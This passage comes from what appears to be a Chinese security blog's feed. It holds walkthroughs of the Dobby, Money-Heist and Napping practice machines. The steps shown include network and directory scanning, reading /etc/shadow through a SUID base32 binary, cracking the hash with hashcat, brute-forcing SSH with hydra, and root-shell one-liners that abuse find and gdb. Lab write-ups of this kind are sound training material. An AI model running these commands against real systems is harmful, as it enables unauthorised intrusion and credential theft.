class="line">/log                  (Status: 200) [Size: 45]   </span><br><span class="line">/phpinfo.php          (Status: 200) [Size: 83234]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/06/12 23:40:07 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./dobby/2.png" alt></p>
<ul>
<li>右键查看网页源码</li>
</ul>
<p><img data-src="./dobby/3.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.151/alohomora/" target="_blank" rel="noopener">http://192.168.43.151/alohomora/</a></li>
</ul>
<p><img data-src="./dobby/4.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.151/log" target="_blank" rel="noopener">http://192.168.43.151/log</a></li>
</ul>
<p><img data-src="./dobby/5.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.151/DiagonAlley/" target="_blank" rel="noopener">http://192.168.43.151/DiagonAlley/</a></li>
</ul>
<p><img data-src="./dobby/6.png" alt></p>
<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><ul>
<li>尝试利用密码登录 <code>Draco \ OjppbGlrZXNvY2tz</code></li>
</ul>
<p><img data-src="./dobby/7.png" alt></p>
<ul>
<li>尝试利用密码登录 <code>draco \ slytherin</code></li>
</ul>
<p><img data-src="./dobby/8.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>登入后台</li>
</ul>
<p><img data-src="./dobby/9.png" alt></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./dobby/10.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./dobby/11.png" alt></p>
<ul>
<li>拿<code>flag</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img data-src="./dobby/12.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec chmod -R 777 /root \;</span><br></pre></td></tr></table></figure>

<p><img data-src="./dobby/13.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li>利用<code>base32</code>读取<code>shadow</code>文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/base32 /etc/shadow | /usr/bin/base32 -d | grep dobby</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">dobby:$6$5zBywVON/Qj/78Yb$ac1hoOn/S/CwZEzl2JZQkKGhkL9N40bV9TJgjF7l3tKSbvGdHrnonYrYfLjF6mwmWrGEojmidvIrrfHEWqSgv.:18573:0:99999:7:::</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 1800 dobby.hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">$6$5zBywVON&#x2F;Qj&#x2F;78Yb$ac1hoOn&#x2F;S&#x2F;CwZEzl2JZQkKGhkL9N40bV9TJgjF7l3tKSbvGdHrnonYrYfLjF6mwmWrGEojmidvIrrfHEWqSgv.:ilikesocks</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: sha512crypt $6$, SHA512 (Unix)</span><br><span class="line">Hash.Target......: $6$5zBywVON&#x2F;Qj&#x2F;78Yb$ac1hoOn&#x2F;S&#x2F;CwZEzl2JZQkKGhkL9N40b...WqSgv.</span><br><span class="line">Time.Started.....: Sun Jun 13 03:32:46 2021, (9 mins, 5 secs)</span><br><span class="line">Time.Estimated...: Sun Jun 13 03:41:51 2021, (0 secs)</span><br><span class="line">Guess.Base.......: File (&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt)</span><br><span class="line">Guess.Queue......: 1&#x2F;1 (100.00%)</span><br><span class="line">Speed.#1.........:     1224 H&#x2F;s (10.47ms) @ Accel:16 Loops:1024 Thr:1 Vec:4</span><br><span class="line">Recovered........: 1&#x2F;1 (100.00%) Digests</span><br><span class="line">Progress.........: 649088&#x2F;14344385 (4.53%)</span><br><span class="line">Rejected.........: 0&#x2F;649088 (0.00%)</span><br><span class="line">Restore.Point....: 649024&#x2F;14344385 (4.52%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000</span><br><span class="line">Candidates.#1....: illham -&gt; iliana06</span><br><span class="line"></span><br><span class="line">Started: Sun Jun 13 03:32:38 2021</span><br><span class="line">Stopped: Sun Jun 13 03:41:53 2021</span><br></pre></td></tr></table></figure>

<p><img data-src="./dobby/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>

<p><img data-src="./dobby/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Hogwarts</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Money-Heist-catch-me-if-you-can</title>
    <url>/2021/04/18/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Money-Heist-catch-me-if-you-can/</url>
    <content><![CDATA[<h1 id="Money-Heist-catch-me-if-you-can"><a href="#Money-Heist-catch-me-if-you-can" class="headerlink" title="Money-Heist-catch-me-if-you-can"></a>Money-Heist-catch-me-if-you-can</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Heist</li>
<li>windows10</li>
</ul>
<h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    6e:20:03:01:84:ed       (Unknown: locally administered)</span><br><span class="line">192.168.43.217   08:00:27:5e:4b:4e       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.217</li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.217</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.217</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-27 03:07 EDT</span><br><span class="line">Nmap scan report for 192.168.43.217</span><br><span class="line">Host is up (0.00046s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0             138 Nov 19 22:31 note.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.43.86</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Money Heist</span><br><span class="line">55001/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e4:a6:ca:17:f6:b9:56:01:56:97:60:d1:f5:89:61:9e (RSA)</span><br><span class="line">|   256 5b:f3:40:09:8e:41:e5:b7:7b:62:ee:91:a8:b2:fb:ea (ECDSA)</span><br><span class="line">|_  256 df:a4:da:43:0e:37:47:06:76:a1:e4:c8:3f:88:18:a4 (ED25519)</span><br><span class="line">MAC Address: 08:00:27:A7:D7:2C (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.46 ms 192.168.43.217</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.43.217/ /usr/share/wordlists/dirb/big.txt -w</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# dirb http://192.168.43.217/ /usr/share/wordlists/dirb/big.txt -w</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Apr 17 22:21:55 2021</span><br><span class="line">URL_BASE: http://192.168.43.217/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span><br><span class="line">OPTION: Not Stopping on warning messages</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 20458                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.43.217/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.43.217/gate/                                                                                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.43.217/img/                                                                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.43.217/robots/                                                                                                                                           </span><br><span class="line">+ http://192.168.43.217/robots.txt (CODE:200|SIZE:97)                                                                                                                                  </span><br><span class="line">+ http://192.168.43.217/server-status (CODE:403|SIZE:279)                                                                                                                              </span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">---- Entering directory: http://192.168.43.217/gate/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">---- Entering directory: http://192.168.43.217/img/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">---- Entering directory: http://192.168.43.217/robots/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Apr 17 22:23:24 2021</span><br><span class="line">DOWNLOADED: 81832 - FOUND: 2</span><br></pre></td></tr></table></figure>



<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./Money-Heist-catch-me-if-you-can/2.png" alt></p>
<h3 id="FTP匿名登录"><a href="#FTP匿名登录" class="headerlink" title="FTP匿名登录"></a>FTP匿名登录</h3><p><img data-src="./Money-Heist-catch-me-if-you-can/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//*//  Hi I'm Ángel Rubio partner of investigator Raquel Murillo. We need your help to catch the professor, will you help us ?  //*//</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 敏感用户信息</span></span><br><span class="line">professor</span><br><span class="line">Ángel Rubio</span><br><span class="line">Raquel Murillo</span><br></pre></td></tr></table></figure>

<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><img data-src="./Money-Heist-catch-me-if-you-can/4.png" alt></p>
<ul>
<li>继续查看</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/5.png" alt></p>
<p>发现一张照片</p>
<h3 id="发现隐藏目录"><a href="#发现隐藏目录" class="headerlink" title="发现隐藏目录"></a>发现隐藏目录</h3><ul>
<li>访问<code>http://192.168.43.217/gate/</code></li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/6.png" alt></p>
<ul>
<li><code>IDA</code>打开发现隐藏目录</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/7.png" alt></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.43.217/BankOfSp41n/</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.43.217/BankOfSp41n/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# dirb http://192.168.43.217/BankOfSp41n/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Apr 18 00:33:58 2021</span><br><span class="line">URL_BASE: http://192.168.43.217/BankOfSp41n/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 20458                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.43.217/BankOfSp41n/ ----</span><br><span class="line">+ http://192.168.43.217/BankOfSp41n/login.php (CODE:200|SIZE:1434)                                                                                                                     </span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Apr 18 00:34:21 2021</span><br><span class="line">DOWNLOADED: 20458 - FOUND: 1</span><br></pre></td></tr></table></figure>

<h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><p><img data-src="./Money-Heist-catch-me-if-you-can/9.png" alt></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/10.png" alt></p>
<ul>
<li>发现敏感信息</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;!-- Hey! help please I'm Arturo Román they are very-dangerous and one more thing may be  old things won't work they are UPDATED, please help me!!! --&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./Money-Heist-catch-me-if-you-can/12.png" alt></p>
<p>发现账号密码 <code>anonymous / B1tCh</code> 登录</p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/13.png" alt></p>
<h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l arturo -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.43.217:55001</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">arturo / corona</span><br></pre></td></tr></table></figure>

<ul>
<li>登录<code>shell</code></li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/14.png" alt></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/15.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./Money-Heist-catch-me-if-you-can/16.png" alt></p>
<ul>
<li>提权失败</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/17.png" alt></p>
<ul>
<li>继续寻找</li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/18.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Don't trust anyone so quickly, until can see everything clearly!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.-</span><br></pre></td></tr></table></figure>

<p><a href="https://cryptii.com/pipes/rot13" target="_blank" rel="noopener">https://cryptii.com/pipes/rot13</a></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/19.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iamabossbitchhere</span><br></pre></td></tr></table></figure>

<p><img data-src="./Money-Heist-catch-me-if-you-can/20.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nairobi / iamabossbitchhere  # ssh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Money-Heist-catch-me-if-you-can/21.png" alt></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/22.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</span><br></pre></td></tr></table></figure>

<p><img data-src="./Money-Heist-catch-me-if-you-can/23.png" alt></p>
<ul>
<li>水平越权到 <code>toyko</code></li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/24.png" alt></p>
<p><img data-src="./Money-Heist-catch-me-if-you-can/25.png" alt></p>
<ul>
<li><code>root</code>密码 <code>india1947</code></li>
</ul>
<p><img data-src="./Money-Heist-catch-me-if-you-can/26.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Heist</tag>
      </tags>
  </entry>
  <entry>
    <title>Napping</title>
    <url>/2021/10/31/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Napping/</url>
    <content><![CDATA[<h1 id="Napping"><a href="#Napping" class="headerlink" title="Napping"></a>Napping</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Napping</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\napping&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.71    00:0c:29:8e:74:a1       VMware, Inc.</span><br><span class="line">192.168.1.72    00:0c:29:41:a1:f2       VMware, Inc.</span><br><span class="line">192.168.1.73    00:0c:29:2c:ea:f0       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.192   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">15 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.064 seconds (124.03 hosts/sec). 15 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.192</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.192</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\napping&gt; nmap -sV -A -p 1-65535 192.168.1.192                                                                                                                    130 ⨯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 16:09 EST</span><br><span class="line">Nmap scan report for napping.lan (192.168.1.192)</span><br><span class="line">Host is up (0.0066s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)</span><br><span class="line">|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)</span><br><span class="line">|_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Login</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=11/7%OT=22%CT=1%CU=34363%PV=Y%DS=1%DC=D%G=Y%M=441CA8%T</span><br><span class="line">OS:M=61884098%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%II=I%TS=A</span><br><span class="line">OS:)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4</span><br><span class="line">OS:ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M5B4NNSNW7%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=</span><br><span class="line">OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=N)T5(R=N)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A</span><br><span class="line">OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=</span><br><span class="line">OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%</span><br><span class="line">OS:DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   6.61 ms napping.lan (192.168.1.192)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.70 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.192/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Thales&gt; gobuster dir -u http://192.168.1.192/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.192/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/07 16:09:29 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/register.php         (Status: 200) [Size: 1566]</span><br><span class="line">/index.php            (Status: 200) [Size: 1219]</span><br><span class="line">/welcome.php          (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/config.php           (Status: 200) [Size: 0]                </span><br><span class="line">/server-status        (Status: 403) [Size: 278]              </span><br><span class="line">                                                             </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/07 16:11:52 Finished</span><br><span class="line">===============================================================</span><br><span class="line">C:\root\vulnhub\Thales&gt;</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Napping/1.png" alt></p>
<ul>
<li>注册</li>
</ul>
<p><img data-src="./Napping/2.png" alt></p>
<ul>
<li>登录发现提示</li>
</ul>
